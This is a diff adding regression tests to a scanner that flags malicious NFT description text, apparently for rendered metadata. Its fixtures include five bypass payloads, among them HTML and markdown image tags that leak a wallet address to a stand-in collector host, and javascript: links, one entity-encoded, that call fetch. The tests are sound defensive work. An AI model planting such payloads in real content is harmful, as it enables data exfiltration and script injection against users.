@@ -155,6 +155,73 @@ test("L4: an auto-fetch image still contributes when something else is present",
   assert.ok(codes.includes("AUTO_FETCH_IMAGE"), `got [${codes.join(", ")}]`);
 });
 
+// The five renderer bypasses a hand review of the corpus turned up. Each was verified CLEAN
+// against the engine before the interpreter was hardened, so each is a regression anchor for
+// a real hole rather than a hypothetical one.
+
+const BYPASSES: Array<{ what: string; text: string; code: string }> = [
+  {
+    what: "raw HTML <img src> — no markdown syntax at all",
+    text: '<img src="https://collector.invalid/h?wallet=0x5afe0000000000000000000000000000000000ab">',
+    code: "IMAGE_EXFIL",
+  },
+  {
+    what: "raw HTML <img srcset> — a candidate list fetches just the same",
+    text: '<img srcset="https://collector.invalid/h?wallet=0x5afe 2x">',
+    code: "IMAGE_EXFIL",
+  },
+  {
+    what: "reference-style image, URL in a separate definition line",
+    text: "![seal][reg]\n\n[reg]: https://collector.invalid/seal?wallet=0x5afe",
+    code: "IMAGE_EXFIL",
+  },
+  {
+    what: "entity-encoded scheme — a browser decodes the href, so must we",
+    text: "[redeem](javascript&#58;fetch('https://c.invalid/x'))",
+    code: "ACTIVE_URI",
+  },
+  {
+    what: "raw HTML <a href> with an active scheme",
+    text: `<a href="javascript:fetch('https://c.invalid/x')">claim</a>`,
+    code: "ACTIVE_URI",
+  },
+];
+
+for (const { what, text, code } of BYPASSES) {
+  test(`L4 bypass: ${what}`, async () => {
+    const f = await scanner.scanField("nft_description", text, { targetContexts: RENDERED });
+    assert.equal(f.severity, "MALICIOUS", `got ${f.severity} with [${f.signals.map((s) => s.code).join(", ")}]`);
+    assert.ok(f.signals.some((s) => s.code === code && s.hard), `expected hard ${code}`);
+  });
+}
+
+test("L4: the same bypasses stay CLEAN when they carry no payload", async () => {
+  // The hardening must not turn "renders an image" into "malicious". Each of these uses the
+  // newly-covered syntax with a parameterless URL, which is what legitimate metadata does.
+  for (const text of [
+    '<img src="https://ipfs.io/ipfs/QmYwAPJzv5CZsnA625s3Xf2nem">',
+    "![p][ipfs]\n\n[ipfs]: https://ipfs.io/ipfs/QmYwAPJzv5CZsnA625s3Xf2nem",
+    '<a href="https://example.com/gallery">the gallery</a>',
+  ]) {
+    const f = await scanner.scanField("nft_description", text, { targetContexts: RENDERED });
+    assert.equal(f.severity, "CLEAN", `${text.slice(0, 40)} → ${f.severity}`);
+  }
+});
+
+test("L4: a reference usage with no matching definition renders as text, not a fetch", async () => {
+  const f = await scanner.scanField("nft_description", "See ![missing][nope] here.", {
+    targetContexts: RENDERED,
+  });
+  assert.deepEqual(f.signals, [], "resolving a label that does not exist would be a phantom signal");
+});
+
+test("L4: prose that merely mentions a tag is not raw HTML", async () => {
+  const f = await scanner.scanField("nft_description", "The metadata uses an <img tag we avoid.", {
+    targetContexts: RENDERED,
+  });
+  assert.deepEqual(f.signals, [], "requiring src=/href= with a URL is what keeps this quiet");
+});
+
 test("L4: a plain link is not an image and raises nothing", async () => {
   const f = await scanner.scanField(
     "nft_description",
